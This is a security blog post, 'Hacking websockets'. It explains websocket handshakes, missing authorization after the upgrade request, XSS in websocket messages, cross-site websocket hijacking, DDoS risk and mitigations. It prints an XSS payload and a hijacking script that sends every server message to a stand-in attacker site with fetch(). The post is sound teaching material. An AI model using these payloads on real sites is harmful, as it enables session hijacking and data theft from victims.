<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-proxy-endpoint" content="https://ch1mp3y-16053.ew.r.appspot.com/query?id=ag9lfmNoMW1wM3ktMTYwNTNyFQsSCEFwaVF1ZXJ5GICAgOjXh4EKDA"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hacking websockets" /><meta property="og:locale" content="en" /><meta name="description" content="categories: [Knowledge Base] tags: [websockets] —" /><meta property="og:description" content="categories: [Knowledge Base] tags: [websockets] —" /><link rel="canonical" href="http://chimpey.com/posts/Websockets/" /><meta property="og:url" content="http://chimpey.com/posts/Websockets/" /><meta property="og:site_name" content="Ch1mp3y" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-07-31T12:50:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hacking websockets" /><meta name="twitter:site" content="@twitter_username" /><meta name="google-site-verification" content="7B-MyW0dy3yjVorlhotvBxXrK4v39i4p1OtKCIAUwJE" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-08-08T13:27:09+02:00","datePublished":"2022-07-31T12:50:00+02:00","description":"categories: [Knowledge Base] tags: [websockets] —","headline":"Hacking websockets","mainEntityOfPage":{"@type":"WebPage","@id":"http://chimpey.com/posts/Websockets/"},"url":"http://chimpey.com/posts/Websockets/"}</script><title>Hacking websockets | Ch1mp3y</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ch1mp3y"><meta name="application-name" content="Ch1mp3y"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://ch1mp3y-16053.ew.r.appspot.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://ch1mp3y-16053.ew.r.appspot.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/RECOVER_Chimpey_vierkant6.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ch1mp3y</a></div><div class="site-subtitle font-italic">Hack all the things!</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/Ch1mp3y" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hacking websockets</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Hacking websockets</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1659264600" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 31, 2022 </em> </span> <span> Updated <em class="" data-ts="1659958029" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Aug 8, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/username">Ch1mp3y</a> </em> </span><div> <span> <em id="pv" class="pageviews"> <i class="fas fa-spinner fa-spin fa-fw"></i> </em> views </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1590 words"> <em>8 min</em> read</span></div></div></div><div class="post-content"><hr /><p>categories: [Knowledge Base] tags: [websockets] —</p><h2 id="index"><span class="mr-2">Index</span><a href="#index" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ul><li><a href="https://ch1mp3y.github.io/posts/Websockets/#intro">Intro</a><li><a href="https://ch1mp3y.github.io/posts/Websockets/#what-is-a-websocket">What is a Websocket</a><li><a href="https://ch1mp3y.github.io/posts/Websockets/#how-to-spot-websockets-in-the-wild">How to spot Websockets in the wild </a><li><a href="https://ch1mp3y.github.io/posts/Websockets/#authentication">Authentication </a><li><a href="https://ch1mp3y.github.io/posts/Websockets/#input-validation-and-output-encoding">Input and output validation</a><li><a href="https://ch1mp3y.github.io/posts/Websockets/#cross-site-websocket-hijacking">Cross-Site websocket hijacking</a><li><a href="https://ch1mp3y.github.io/posts/Websockets/#websocket-ddos">Websocket DDOS</a><li><a href="https://ch1mp3y.github.io/posts/Websockets/#mitigations">Mitigations </a></ul><h2 id="intro"><span class="mr-2">Intro</span><a href="#intro" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I know, I know. Hacking websockets just doesn’t sound as sexy has hacking domain controllers. But still, websocket usage is widespread and an easily overlooked functionality. Normally, I encounter websockets that are used for collecting user data, data streams and chat functionalities. Recently however, I encountered a website which used a websocket for EVERYTHING and this is where it becomes interesting because there are actually quite a few scenarios you can exploit.</p><p>But before we continue, let’s talk about what a websocket actually is.</p><h2 id="what-is-a-websocket"><span class="mr-2">What is a Websocket</span><a href="#what-is-a-websocket" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>A websocket is a network protocol. It’s basically a set of rules that determine how data is transmitted between different devices within the same network. In the case of a websocket it’s a full duplex &amp; bidirectional communication protocol. This means it’s a two way street. To make this more clear let’s compare it to the HTTP protocol. The HTTP protocol is a strictly unidirectional protocol. This means that the server cannot respond on its own. You first need to send a request in order to make the server send a response. With a websocket the server can respond without having to wait for a request from the client. This is possible because a websocket connects to the server using HTTP as the initial transport mechanism, but then keeps the connection alive after the server sends the HTTP response, it basically creates a tunnel that stays open for sending messages between client and server.</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 821 536'%3E%3C/svg%3E" data-src="/assets/img/Training/Websockets/Websocket.png" alt="Desktop View" width="821" height="536" data-proofer-ignore></p><p>This means websockets can transfer data very quickly making it ideal for real-time applications like chat functionalities, video streams or multiplayer games.</p><p>The protocol that the websocket uses is <code class="language-plaintext highlighter-rouge">WS://</code> or <code class="language-plaintext highlighter-rouge">WSS://</code>. <code class="language-plaintext highlighter-rouge">WS://</code> connects via HTTP which is an unencrypted channel. In terms of security this is <strong>no bueno</strong>. <code class="language-plaintext highlighter-rouge">WSS://</code>, you probably already guessed it, connects via HTTPS and is encrypted.</p><h2 id="how-to-spot-websockets-in-the-wild"><span class="mr-2">How to spot websockets in the wild</span><a href="#how-to-spot-websockets-in-the-wild" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>How do you know the application is using a websocket? As seen in the picture above, if the server supports websocket connections, it will respond with a <code class="language-plaintext highlighter-rouge">101 switching protocols</code> on an upgrade connection request.</p><p>We start with a HTTP handshake when creating the connection and after that we are telling the server we want to use the TCP connection for a different protocol using the following headers: <code class="language-plaintext highlighter-rouge">Connection: Upgrade</code> and <code class="language-plaintext highlighter-rouge">Upgrade: websocket</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>GET /chimpey HTTP/1.1
Host: exploit-chimpey.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Sec-WebSocket-Version: 13
Origin: https://exploit-chimpey.com
Sec-WebSocket-Key: 3oHQtmSHZ0A7pHWwRHUtkA==
&lt;b&gt;Connection: Upgrade&lt;/b&gt;
Sec-Fetch-Dest: websocket
Sec-Fetch-Mode: websocket
Sec-Fetch-Site: same-origin
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket
</pre></table></code></div></div><p>If the server supports websockets it will respond with something like the following:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>HTTP/1.1 101 Switching Protocol
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: XKM8nFVMfy5LIGEW2nJClXyOWyI=
Content-Length: 0
</pre></table></code></div></div><p>Another good indication that the application is using a websocket is the <code class="language-plaintext highlighter-rouge">Sec-Websocket-key</code> header. During the websocket handshake the client gives a “Sec-WebSocket-Key” with a base64 encoded value:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>GET /chimpey HTTP/1.1
Host: exploit-chimpey.com
[...]
Sec-WebSocket-Version: 13
Origin: https://exploit-chimpey.com
Sec-WebSocket-Key: 3oHQtmSHZ0A7pHWwRHUtkA==
</pre></table></code></div></div><p>Do note that this is not a session ID, cookie or CSRF-token. The server takes the <code class="language-plaintext highlighter-rouge">Sec-Websocket-key</code> value, does some magic with it and then returns the transformed value in the <code class="language-plaintext highlighter-rouge">Sec-websocket-accept</code> header:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>HTTP/1.1 101 Switching Protocol
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: XKM8nFVMfy5LIGEW2nJClXyOWyI=
Content-Length: 0
</pre></table></code></div></div><p>The header is sent from the server to the client to inform that the server is willing to start a websocket connection.</p><p>In short:</p><ul><li>Check for a response containing status code <code class="language-plaintext highlighter-rouge">101 switching protocols</code>.<li>See if requests contain a <code class="language-plaintext highlighter-rouge">Sec-wesocket-key</code> header.</ul><h2 id="authentication"><span class="mr-2">Authentication</span><a href="#authentication" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>There are ways to force authentication on a websocket, but in general a websocket doesn’t handle authentication/authorization. Beyond the upgrade request, you are on your own.</p><p>What usually happens is something like this: With the upgrade request the client sends some form of token: a cookie-value or a session token or something. The server then responds with the <code class="language-plaintext highlighter-rouge">101 switching protocols</code>. After the connection is established no further checks on authentication are done.</p><p>Everything you send via the websocket is generally free from any authentication tokens.</p><p>Any valid request body can be send via a websocket, so for example the following JSON could be send:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>{"message":"Hello Chimpey"}
</pre></table></code></div></div><p>And the server can respond with any valid response body as well. In this case, probably some JSON.</p><p>Remember I said I spotted a website that handles EVERYTHING through a websocket? The website used role-based authentication and did not do any authentication/authorization checking after the websocket connection was established. It was very easy for me to do requests, accessing functionality intended for users with more privileges.</p><p>This was possible because after the websocket handshake there are no authorisation checks and most importantly data was send over <code class="language-plaintext highlighter-rouge">WS://</code>, which means that data was not encrypted.</p><p>The cookie that is sent to the server during the handshake, is basically your main mechanism for authentication. This makes it very prone for session hijacking when certain security measures aren’t met. But we will talk about all this sweetness in the <a href="">websocket hijacking</a> chapter.</p><h2 id="input-validation-and-output-encoding"><span class="mr-2">Input validation and output encoding</span><a href="#input-validation-and-output-encoding" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Just like traditional HTTP GET and POST requests can be vulnerable for certain attacks, so are websockets. Cross-Site Scripting (XSS) attacks, SQL injection, XML-based attacks and other injection attacks can happen just as easily via a websocket depending on how data is processed in the application.</p><p>In the application I tested, they handled input validation and output encoding pretty well. However, there was one request with a html payload which was actually vulnerable to Cross-Site Scripting:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>{
    "data": "showModal: true, 
    "html": "&lt;img src=1 onerror='alert("Chimpey was here!")' /&gt;"
}
</pre></table></code></div></div><p>So if you are doing any input validation and output encoding, <strong>be consistent</strong>.</p><h2 id="cross-site-websocket-hijacking"><span class="mr-2">Cross-Site websocket hijacking</span><a href="#cross-site-websocket-hijacking" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Ah yeah! We have arrived at the fun part: Cross-Site Websocket Hijacking!</p><p>This is a common vulnerability for websockets. The issue lies in the initial upgrade connection request. During this stage a cookie-value or other authentication token is sent to the server. When the authentication mechanism relies solely on this value and does not contain a CSRF-token or other unpredictable value, there is a big chance the application is going to be vulnerable to Cross-Site Websocket Hijacking.</p><p>What we want to do is establish a websocket connection from our own malicious website to the server of the victim which we will call victim.com</p><p>The first thing an attacker needs to do is create his or her own website, for example (http://chimpeys-evil-website.com). Next, we need to create a script and embed the script in the malicious website.</p><p>As an example I used the script from <a href="https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking">here</a>:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>
<span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
    <span class="kd">var</span> <span class="nx">ws</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="dl">'</span><span class="s1">wss://victim.com</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">ws</span><span class="p">.</span><span class="nx">onopen</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">READY</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">};</span>
    <span class="nx">ws</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">fetch</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://chimpeys-evil-website.com</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="na">method</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span> <span class="na">mode</span><span class="p">:</span> <span class="dl">'</span><span class="s1">no-cors</span><span class="dl">'</span><span class="p">,</span> <span class="na">body</span><span class="p">:</span> <span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">});</span>
    <span class="p">};</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span>
</pre></table></code></div></div><p>The script will establish a websocket connection from http://chimpeys-evil-website.com to victim.com</p><p>What we want to do next is trick a user of victim.com to open our webpage with the embedded script.</p><p>So what happens is the following:<br /> When the victim visits our malicious webpage the script will make a connection from https://chimpeys-evil-website.com to the server victim.com. Because the user has opened it from their own browser, his or her credentials are send with the websocket handshake.</p><p>What we have now as the attacker, is a websocket connection with victim.com with the same level of access as the victim user.</p><p>Cross-Site Websocket Hijacking attacks are very similar to Cross-Site Request Forgery (CSRF) attacks. The above scenario is actually a CSRF attack. However, because we now have a websocket connection there is a small difference. With a CSRF attack we can force the user to execute unwanted actions on a web application like we did above. But because we have a websocket connection we cannot only force the user to execute unwanted actions, we can also read messages sent from the server back to us.</p><p>You can actually test for Cross-site websocket hijacking on the <a href="https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking">Portswigger website</a></p><p>Another common attack is a websocket DDOS.</p><h2 id="websocket-ddos"><span class="mr-2">Websocket DDOS</span><a href="#websocket-ddos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Websockets.. they are too cool for school. They don’t do rate limiting by default so it all depends on the developer and how the websocket is configured. Because of this, servers can potentially allow an unlimited amount of requests, which makes it vulnerable to DDOS attacks. If a malicious user manages to get hold of a websocket, he/she can flood the server by sending lots and lots of data. This can drastically slow down the web application or even crash the server making the website unavailable.</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 314 363'%3E%3C/svg%3E" data-src="/assets/img/Training/Websockets/WebsocketDDOS.png" alt="Desktop View" width="314" height="363" data-proofer-ignore></p><h2 id="mitigations"><span class="mr-2">Mitigations</span><a href="#mitigations" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>How can we secure the websocket against all this madness? Well, there are some things you can do to mitigate these kind of risks.</p><ul><li>Make sure to use the encrypted (wss://) protocol. This will help you protect against man-in-the-middle attacks.<li>Verify the origin header during the handshake process. This header is designed to protect against cross-origin attacks. Also, use the Access-Control-Allow-Origin header on the server side.<li>Use CSRF tokens to protect the handshake against CSRF attacks.<li>Apply authentication best-practices for websockets. See for example <a href="https://www.freecodecamp.org/news/how-to-secure-your-websocket-connections-d0be0996c556/">this article</a> for tips.<li>Always do input validation! And make sure to always encode the output when embedded in the application.</ul><p>Well that’s it for now folks, hope to see you on the next hacking adventure!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/knowledge-base/'>KNOWLEDGE BASE</a>, <a href='/categories/hacking-websockets/'>Hacking websockets</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/websockets/" class="post-tag no-text-decoration" >websockets</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hacking+websockets+-+Ch1mp3y&url=http%3A%2F%2Fchimpey.com%2Fposts%2FWebsockets%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hacking+websockets+-+Ch1mp3y&u=http%3A%2F%2Fchimpey.com%2Fposts%2FWebsockets%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=http%3A%2F%2Fchimpey.com%2Fposts%2FWebsockets%2F&text=Hacking+websockets+-+Ch1mp3y" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Websockets/">Hacking websockets</a><li><a href="/posts/Docker/">Escaping Docker containers</a><li><a href="/posts/TENTACLE/">HTB-Tentacle</a><li><a href="/posts/SECRET/">HTB-Secret</a><li><a href="/posts/DRIVER/">HTB-Driver</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/driver/">driver</a> <a class="post-tag" href="/tags/secret/">secret</a> <a class="post-tag" href="/tags/tentacle/">tentacle</a> <a class="post-tag" href="/tags/websockets/">websockets</a></div></div></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Docker/"><div class="card-body"> <em class="small" data-ts="1658047020" data-df="ll" > Jul 17, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Escaping Docker containers</h3><div class="text-muted small"><p> categories: [Knowledge Base] tags: [Docker] — It’s all I hear people talk about these days; ‘Kubernetes’, ‘The Cloud’ which seems to be the final place all the good holy builds go and containeri...</p></div></div></a></div><div class="card"> <a href="/posts/TENTACLE/"><div class="card-body"> <em class="small" data-ts="1657543500" data-df="ll" > Jul 11, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB-Tentacle</h3><div class="text-muted small"><p> categories: [Hack the Box] tags: [Tentacle] — Index enumeraing Proxy Squid Exploiting OpenSMTPD 2.0.0 The powers of Kerberos combined with SSH Exploiting the log_backup script ...</p></div></div></a></div><div class="card"> <a href="/posts/SECRET/"><div class="card-body"> <em class="small" data-ts="1657474920" data-df="ll" > Jul 10, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB-Secret</h3><div class="text-muted small"><p> categories: [Hack the Box] tags: [Secret] — Target machine: 10.129.198.24 Attack machine: Secret from Hack the Box Index Enumerating Register user and Login Code Review Creating adm...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Docker/" class="btn btn-outline-primary" prompt="Older"><p>Escaping Docker containers</p></a><div class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></div></div><script src="https://utteranc.es/client.js" repo="Ch1mp3y/ch1mp3y.github.io" issue-term="url" crossorigin="anonymous" async> </script> <script type="text/javascript"> $(function() { const origin = "https://utteranc.es"; const iframe = "iframe.utterances-frame"; const lightTheme = "github-light"; const darkTheme = "github-dark"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } addEventListener("message", (event) => { let theme; /* credit to <https://github.com/utterance/utterances/issues/170#issuecomment-594036347> */ if (event.origin === origin) { /* page initial */ theme = initTheme; } else if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); } else { return; } const message = { type: "set-theme", theme: theme }; const utterances = document.querySelector(iframe).contentWindow; utterances.postMessage(message, origin); }); }); </script></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/username">Ch1mp3y</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/driver/">driver</a> <a class="post-tag" href="/tags/secret/">secret</a> <a class="post-tag" href="/tags/tentacle/">tentacle</a> <a class="post-tag" href="/tags/websockets/">websockets</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/npm/countup.js@1.9.3/dist/countUp.min.js"></script> <script defer src="/assets/js/dist/pvreport.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script 